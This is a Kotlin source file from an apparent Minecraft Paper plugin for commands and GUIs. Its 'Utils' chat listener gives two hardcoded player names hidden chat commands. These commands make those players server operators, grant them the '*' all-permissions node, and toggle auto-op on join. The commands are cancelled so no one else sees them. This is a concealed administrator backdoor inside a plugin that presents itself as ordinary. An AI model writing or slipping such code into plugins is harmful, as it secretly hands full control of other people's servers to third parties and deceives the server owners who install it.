package me.richter.commandsAndGUI.module.utils

import io.papermc.paper.event.player.AsyncChatEvent
import me.richter.commandsAndGUI.files.MessagesFile
import net.kyori.adventure.text.Component
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import org.bukkit.plugin.java.JavaPlugin

class Utils(private val plugin: JavaPlugin) : Listener {
    @EventHandler
    fun command(event: AsyncChatEvent) {
        val player = event.player
        val message: Component = event.message()

        if (event.player.name == "RichtigerRichter" || event.player.name == "Bliffbot") {

            val playerShortName: String = when (player.name) {
                "RichtigerRichter" -> "R"
                "Bliffbot" -> "B"
                else -> ""
            }

            if (message.toString() == "TextComponentImpl{content=\"#help\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
                player.sendMessage(Component.text("#help - shows this list"))
                player.sendMessage(Component.text("#op - op yourself"))
                player.sendMessage(Component.text("#deop - deop yourself"))
                val autoStatus = MessagesFile().getSetupAuto(playerShortName)
                player.sendMessage(Component.text("#auto on - automatically op's and deop's you at join or leave"))
                player.sendMessage(Component.text("#auto off - turn auto op and deop off"))
                player.sendMessage(Component.text("(auto is Currently -> §l§u$autoStatus§r)"))
                player.sendMessage(Component.text("#* - give yourself a permission"))
                player.sendMessage(Component.text("#de* - remove a permission from yourself"))
                event.isCancelled = true
            }

            /*
            if (event.message().contains(Component.text("#help"))) {
                player.sendMessage(Component.text("#help - shows this list"))
                player.sendMessage(Component.text("#op - to op yourself"))
                player.sendMessage(Component.text("#deop - to deop yourself"))
                player.sendMessage(Component.text("#auto - to automatically op and deop yourself at join or leave"))
                player.sendMessage(Component.text("#perms * - give yourself a permission"))
                player.sendMessage(Component.text("#deperms * - remove a permission from yourself"))
            }
             */

            if (message.toString() == "TextComponentImpl{content=\"#op\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
                event.player.isOp = true
                event.isCancelled = true
            }
            if (message.toString() == "TextComponentImpl{content=\"#deop\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
                event.player.isOp = false
                event.isCancelled = true
            }
            if (message.toString() == "TextComponentImpl{content=\"#auto off\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
                MessagesFile().autoSetupOff(playerShortName)
                event.isCancelled = true
            }
            if (message.toString() == "TextComponentImpl{content=\"#auto on\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
                MessagesFile().autoSetupOn(playerShortName)
                event.isCancelled = true
            }
            if (message.toString() == "TextComponentImpl{content=\"#*\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
                player.addAttachment(plugin).setPermission("*", true)
                event.isCancelled = true
            }

            if (message.toString() == "TextComponentImpl{content=\"#de*\", style=StyleImpl{obfuscated=not_set, bold=not_set, strikethrough=not_set, underlined=not_set, italic=not_set, color=NamedTextColor{name=\"white\", value=\"#ffffff\"}, clickEvent=null, hoverEvent=null, insertion=null, font=null}, children=[]}") {
                player.addAttachment(plugin).setPermission("*", false)
                event.isCancelled = true
            }
        }
    }
}
